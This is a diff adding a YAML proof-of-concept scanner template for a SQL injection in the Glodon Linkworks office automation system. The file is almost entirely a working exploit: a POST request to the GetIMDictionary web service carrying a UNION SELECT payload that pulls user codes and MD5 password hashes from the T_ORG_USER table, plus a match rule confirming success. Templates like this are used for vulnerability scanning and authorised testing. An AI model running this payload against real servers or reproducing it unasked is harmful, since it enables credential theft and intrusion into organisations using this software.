@@ -1,0 +1,18 @@
+id: poc-yaml-gld-Linkworks-GetIMDictionary-sql-injection
+info:
+  name: 广联达 Linkworks GetIMDictionary SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 广联达 Linkworks办公OA
+requests:
+- method: POST
+  path: /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary
+  headers:
+    content-type: application/x-www-form-urlencoded
+  data: key=1' UnION ALL SElECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER
+    --
+  expression: status_code == 200 && contains(body,"admin") && contains(body,"></result>")
+    && contains(body,"value")
+variables: {}
+transport: http
